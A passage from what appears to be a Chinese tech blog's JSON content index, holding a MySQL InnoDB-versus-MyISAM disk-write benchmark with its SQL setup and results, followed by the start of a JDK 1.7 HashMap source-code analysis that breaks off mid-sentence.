\"(dd if=/dev/zero of=test.dd  bs=1000K count=20000;sync)\"\n20000+0 records in\n20000+0 records out\n20480000000 bytes (20 GB, 19 GiB) copied, 103.692 s, 198 MB/s\nreal 111.08\nuser 0.02\nsys 31.16\n\n<!-- 读性能 -->\n$ sudo echo 3 > /proc/sys/vm/drop_caches ; /usr/bin/time -p dd if=test.dd of=/dev/null  bs=1M \n-bash: /proc/sys/vm/drop_caches: Permission denied\n19531+1 records in\n19531+1 records out\n20480000000 bytes (20 GB, 19 GiB) copied, 83.2042 s, 246 MB/s\nreal 83.20\nuser 0.09\nsys 12.90\n\n```\n\n\n```\ncreate database performance default charset utf8mb4;\nuser performance;\n\ncreate table user1(\n    id int not null,\n    name varchar(20) not null,\n    sex tinyint(1) not null,\n    email varchar(255) not null,\n    company varchar(255) not null,\n    address varchar(255) not null\n) engine=InnoDB;\n\ncreate table user2(\n    id int not null,\n    name varchar(20) not null,\n    sex tinyint(1) not null,\n    email varchar(255) not null,\n    company varchar(255) not null,\n    address varchar(255) not null\n) engine=InnoDB;\n\ncreate table user3(\n    id int not null,\n    name varchar(20) not null,\n    sex tinyint(1) not null,\n    email varchar(255) not null,\n    company varchar(255) not null,\n    address varchar(255) not null\n);\n\ncreate table user4(\n    id int not null,\n    name varchar(20) not null,\n    sex tinyint(1) not null,\n    email varchar(255) not null,\n    company varchar(255) not null,\n    address varchar(255) not null\n)engine=MyISAM;\n\ncreate table user5(\n    id int not null,\n    name varchar(20) not null,\n    sex tinyint(1) not null,\n    email varchar(255) not null,\n    company varchar(255) not null,\n    address varchar(255) not null\n)engine=MyISAM;\n\ncreate table user6(\n    id int not null,\n    name varchar(20) not null,\n    sex tinyint(1) not null,\n    email1 varchar(255) not null,\n    email2 varchar(255) not null,\n    email3 varchar(255) not null,\n    email4 varchar(255) not null,\n    email5 varchar(255) not null,\n    email6 varchar(255) not null,\n    email7 varchar(255) not null,\n    email8 varchar(255) not null,\n    company varchar(255) not null,\n    address varchar(255) not null\n)engine=MyISAM;\n\ncreate table user7(\n    id int not null,\n    name varchar(20) not null,\n    sex tinyint(1) not null,\n    email1 varchar(255) not null,\n    email2 varchar(255) not null,\n    email3 varchar(255) not null,\n    email4 varchar(255) not null,\n    email5 varchar(255) not null,\n    email6 varchar(255) not null,\n    email7 varchar(255) not null,\n    email8 varchar(255) not null,\n    email9 varchar(255) not null,\n    email10 varchar(255) not null,\n    email11 varchar(255) not null,\n    email12 varchar(255) not null,\n    email13 varchar(255) not null,\n    email14 varchar(255) not null,\n    email15 varchar(255) not null,\n    email16 varchar(255) not null,\n    company varchar(255) not null,\n    address varchar(255) not null\n)engine=MyISAM;\n\ncreate table user8(\n    id int not null,\n    name varchar(20) not null,\n    sex tinyint(1) not null,\n    email1 varchar(255) not null,\n    email2 varchar(255) not null,\n    email3 varchar(255) not null,\n    email4 varchar(255) not null,\n    email5 varchar(255) not null,\n    email6 varchar(255) not null,\n    email7 varchar(255) not null,\n    email8 varchar(255) not null,\n    email9 varchar(255) not null,\n    email10 varchar(255) not null,\n    email11 varchar(255) not null,\n    email12 varchar(255) not null,\n    email13 varchar(255) not null,\n    email14 varchar(255) not null,\n    email15 varchar(255) not null,\n    email16 varchar(255) not null,\n    company varchar(255) not null,\n    address varchar(255) not null\n)engine=InnoDB;\n```\n\n```sql\ndelimiter $$\nCREATE PROCEDURE user1_insert(IN count int)\nbegin\nDECLARE x int;\nSET x = 1;\nSET count = count + 1;\nSTART TRANSACTION; \nREPEAT\n    insert into `user1` values(x, \"abc\", 1, \"abc@abc.com\", \"abc.com\", \"New York\");\n    set x = x + 1;\nuntil x = count END REPEAT;\nCOMMIT;\nEND$$\ndelimiter ;\n-- 34kb\n\ndelimiter $$\nCREATE PROCEDURE user2_insert(IN count int)\nbegin\nDECLARE x int;\nSET x = 1;\nSET count = count + 1;\nSTART TRANSACTION; \nREPEAT\n    insert into `user2` values(x, \"abcdefghijklmnopqrst\", 1, \"abcdefghijklm@abcdefghijkl.com\", \"abcdefghijklmnopqrstuvwxyz.com\", \"New York, American\");\n    set x = x + 1;\nuntil x = count END REPEAT;\nCOMMIT;\nEND$$\ndelimiter ;\n-- 103kb 实际是112kb\n\ndelimiter $$\nCREATE PROCEDURE user2_insert(IN count int)\nbegin\nDECLARE x int;\nSET x = 1;\nSET count = count + 1;\nSTART TRANSACTION; \nREPEAT\n    insert into `user2` values(x, \"abcdefghijklmnopqrst\", 1, \"abcdefghijklm@abcdefghijkl.com\", \"abcdefghijklmnopqrstuvwxyz.com\", \"New York, American\");\n    set x = x + 1;\nuntil x = count END REPEAT;\nCOMMIT;\nEND$$\ndelimiter ;\n\n\ndelimiter $$\nCREATE PROCEDURE user4_insert(IN count int)\nbegin\nDECLARE x int;\nSET x = 1;\nSET count = count + 1;\nSTART TRANSACTION; \nREPEAT\n    insert into `user4` values(x, \"abcdefghijklmnopqrst\", 1, \"abcdefghijklm@abcdefghijkl.com\", \"abcdefghijklmnopqrstuvwxyz.com\", \"New York, American\");\n    set x = x + 1;\nuntil x = count END REPEAT;\nCOMMIT;\nEND$$\ndelimiter ;\n\n\ndelimiter $$\nCREATE PROCEDURE user6_insert(IN count int)\nbegin\nDECLARE x int;\nSET x = 1;\nSET count = count + 1;\nSTART TRANSACTION; \nREPEAT\n    insert into `user6` values(x, \"abcdefghijklmnopqrst\", 1, \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"New York, American\");\n    set x = x + 1;\nuntil x = count END REPEAT;\nCOMMIT;\nEND$$\ndelimiter ;\n\ndelimiter $$\nCREATE PROCEDURE user7_insert(IN count int)\nbegin\nDECLARE x int;\nSET x = 1;\nSET count = count + 1;\nSTART TRANSACTION; \nREPEAT\n    insert into `user7` values(x, \"abcdefghijklmnopqrst\", 1, \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"New York, American\");\n    set x = x + 1;\nuntil x = count END REPEAT;\nCOMMIT;\nEND$$\ndelimiter ;\n\ndelimiter $$\nCREATE PROCEDURE user8_insert(IN count int)\nbegin\nDECLARE x int;\nSET x = 1;\nSET count = count + 1;\nSTART TRANSACTION; \nREPEAT\n    insert into `user8` values(x, \"abcdefghijklmnopqrst\", 1, \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.abcdefghijklmnopqrstuvwxyz.com\", \n    \t\"New York, American\");\n    set x = x + 1;\nuntil x = count END REPEAT;\nCOMMIT;\nEND$$\ndelimiter ;\n\n```\n\n查看 MySQL 数据存放位置\n\n```\nshow global variables like \"%datadir%\";\n```\n\n查看磁盘 io 性能\n\n\n```\niostat -d -k 1 |grep sda\n\nDevice:            tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn\n\n```\n\n\n| 引擎   | 数据大小/条 | 索引 | 数据条数  | 总数据大小     | 时间             | 备注             | 硬盘速度            |\n| ------ | ----------- | ---- | --------- | -------------- | ---------------- | ---------------- | ------------------- |\n| InnoDB | 4136B       | 无   | 5,000,000 | 27,728,543,744 | 45 min 58.50 sec | REPEATABLE-READ  | 10,052,037=9.57M/s  |\n| MyISAM | 4136B       | 无   | 5,000,000 | 20,680,000,000 | 2 min 55.91 sec  |                  | 117,560,116=112M/s  |\n| MyISAM | 2216B       | 无   | 5,000,000 | 11,080,000,000 | 1 min 49.14 sec  |                  | 101,520,982=96.8M/s |\n| InnoDB | 4136B       | 无   | 5,000,000 | 27,715,960,832 | 45 min 21.71 sec | READ-UNCOMMITTED | 10,183,289=9.71M/s   |\n| MyISAM | 112B        | 无   | 5,000,000 | 560,000,000    | 50.24 sec        |                  | 11,146,496=10.63M/s |\n| MyISAM | 536B        | 无   | 5,000,000 | 2,680,000,000  | 1 min 2.56 sec   |                  | 42,838,874=40.85M/s |\n|        |             |      |           |                |                  |                  |                     |\n\n","categories":["MySQL"],"tags":["MySQL"]},{"title":"JDK 分析之 Hashmap","url":"/2019/02/2019-02-01-java-jdk-hashmap-analysis/","content":"\n#### JDK 1.7\n\n先看 JDK1.7，这个版本现在可能用的少了，但是这里仍然有我们可以学习的地方。\n\n<!-- more -->\n\n```java\nstatic final int DEFAULT_INITIAL_CAPACITY = 1 << 4; // aka 16\n// 默认的初始化容量 - 必须是 2 的整数次幂 【】\n\nstatic final int MAXIMUM_CAPACITY = 1 << 30;\n// 最大的容量，当指定初始化的容量大于这个数值的时候，容量就是他了 【1】\n\nstatic final float DEFAULT_LOAD_FACTOR = 0.75f;\n// 默认加载因子\n\nstatic final Entry<?,?>[] EMPTY_TABLE = {};\n// 未初始化时的 table。HashMap 底层维护这个数组，数组中的每一项都是一个Entry。我们向 HashMap 中所放置的对象实际上是存储在该数组当中；\n\ntransient Entry<K,V>[] table = (Entry<K,V>[]) EMPTY_TABLE;\n// the table，必要的时候扩容，容量必须是 2 的整数次幂\n\ntransient int size;\n// 表中键值对的个数\n\nint threshold;\n// 阈值（容量*加载因子），如果 size 超过这个大小，就说明需要扩容了。初始的阈值就是初始化的容量\n\nfinal float loadFactor;\n// 加载因子\n\ntransient int modCount;\n// 记录 hash 表结构变动的次数，这个会用在 iterator 中，HashMap fail-fast 机制。\n\n```\n\n【1】最大容量\n\n```java\npublic HashMap(int initialCapacity, float loadFactor) {\n    if (initialCapacity < 0)\n        throw new IllegalArgumentException(\"Illegal initial capacity: \" +\n                                            initialCapacity);\n    if (initialCapacity > MAXIMUM_CAPACITY)\n        initialCapacity = MAXIMUM_CAPACITY;\n    // 当自定义的容量超过了最大容量，则容量为最大容量\n    if (loadFactor <= 0 || Float.isNaN(loadFactor))\n        throw new IllegalArgumentException(\"Illegal load factor: \" +\n                                            loadFactor);\n\n    this.loadFactor = loadFactor;\n    threshold = initialCapacity; // 初始的阈值就是初始化的容量\n    init();\n    // 这里的 init()是空的，很多人不理解，init()的叫法是JDK7里面的，以后的改成了 reinitialize()。作用差不多。LinkedHashMap要维持插入顺序，为此它会把所有插入的节点（键值对）用双向链表串在一起。而在它的init()实现里，它就创建并初始化了该双向链表的头节点。之所以需要这个init()钩子，是因为HashMap是可序列化的，而反序列化方法（readObject()）是一个跟构造器性质相似、但却不是构造器的奇怪的东西。为了让子类能方便规整地实现构造初始化与反序列初始化的功能，HashMap就在构造器末尾和反序列化方法末尾都埋了这个init()钩子，这样子类就不用为这两种不同的初始化需求而重复头疼了。\n    // https://www.zhihu.com/question/51095396/answer/124162684\n}\n```\n\n【2】计算 hashCode\n\nEntry 应该放在数组的哪一个位置上（这个位置通常称为位桶或者 hash 桶，即 hash 值相同的 Entry 会放在同一位置，用链表相连），是通过 key 的 hashCode 来计算的。\n\n```java\nfinal int hash(Object k) {\n    int h = hashSeed;\n    if (0 != h && k instanceof String) {\n        return sun.misc.Hashing.stringHash32((String) k);\n    }\n\n    h ^= k.hashCode();\n\n    // This function ensures that hashCodes that differ only by\n    // constant multiples at each bit position have a bounded\n    // number of collisions (approximately 8 at default load factor).\n    // 这样计算的好处是能够让 hash 的每个位都能参与计算\n    h ^= (h >>> 20) ^ (h >>> 12);\n    return h ^ (h >>> 7) ^ (h >>> 4);\n}\n```\n\n【3】寻找下标\n\n通过 hash 计算出来的值将会使用 indexFor 方法找到它应该所在的 table 下标\n\n```java\nstatic int indexFor(int h, int length) {\n    // assert Integer.bitCount(length) == 1 : \"length must be a non-zero power of 2\";\n    return h & (length-1);\n    // 相当于对 table.length 取模\n    // 与运算替代模运算。用 hash & (table.length-1) 替代 hash % (table.length)\n}\n```\n\n【4】hash 冲突\n\nHashmap里面的bucket出现了单链表的形式，散列表要解决的一个问题就是散列值的冲突问题，通常是两种方法：链表法和开放地址法。链表法就是将相同hash值的对象组织成一个链表放在hash值对应的槽位；开放地址法是通过一个探测算法，当某个槽位已经被占据的情况下继续查找下一个可以使用的槽位。java.util.HashMap采用的链表法的方式，链表是单向链表。形成单链表的核心代码如下\n\n\n```java\nvoid createEntry(int hash, K key, V value, int bucketIndex) {\n    Entry<K,V> e = table[bucketIndex];\n    table[bucketIndex] = new Entry<>(hash, key, value, e);\n    size++;\n}\n```\n\n上面方法的代码很简单，但其中包含了一个设计：系统总是将新添加的 Entry 对象放入 table 数组的 bucketIndex 索引处——如果 bucketIndex 索引处已经有了一个 Entry 对象，那新添加的 Entry 对象指向原有的 Entry 对象（产生一个 Entry 链），如果 bucketIndex 索引处没有 Entry 对象，也就是上面程序代码的 e 变量是 null，也就是新放入的 Entry 对象指向 null，也就是没有产生 Entry 链。\n\nJDK 1.7 中出现哈希冲突后，把新的值放在头部，然后把原来的链接在后面。在扩容的时候先从第一个开始取，得到的新表如果还有哈希冲突，顺序正好相反。【11】\n\n这里可能还会出现一个死循环的问题，详见 [https://juejin.im/post/5a66a08d5188253dc3321da0](https://juejin.im/post/5a66a08d5188253dc3321da0)\n\n\n【5】put 方法\n\n\n```java\npublic V put(K key, V value) {\n    if (table == EMPTY_TABLE) {\n        inflateTable(threshold); // 空表初始化【6】\n    }\n    if (key == null)\n        return putForNullKey(value); // key 为 null 的时候 【7】\n    int hash = hash(key);\n    int i = indexFor(hash, table.length);\n    for (Entry<K,V> e = table[i]; e != null; e = e.next) {\n        Object k;\n        // 如果有相同的 key，则直接替换 value，返回 oldValue\n        if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {\n            V oldValue = e.value;\n            e.value = value;\n            e.recordAccess(this);\n            return oldValue;\n        }\n    }\n\n    // 没有相同的 key，添加 Entry 【8】\n    modCount++;\n    addEntry(hash, key, value, i);\n    return null;\n}\n```\n\n【6】初始化 hash 表\n\n```java\nprivate void inflateTable(int toSize) {\n    // Find a power of 2 >= toSize 找到一个大于初始大小的 2 的整数次幂\n    int capacity = roundUpToPowerOf2(toSize);\n\n    threshold = (int) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + 1); // 重新计算阈值\n    table = new Entry[capacity]; // 初始化空间\n    initHashSeedAsNeeded(capacity);\n}\n\nfinal boolean initHashSeedAsNeeded(int capacity) {\n    boolean currentAltHashing = hashSeed != 0;\n    boolean useAltHashing = sun.misc.VM.isBooted() &&\n            (capacity >= Holder.ALTERNATIVE_HASHING_THRESHOLD);\n    boolean switching = currentAltHashing ^ useAltHashing;\n    if (switching) {\n        hashSeed = useAltHashing\n            ? sun.misc.Hashing.randomHashSeed(this)\n            : 0;\n    }\n    return switching;\n}\n```\n\n【7】key 为 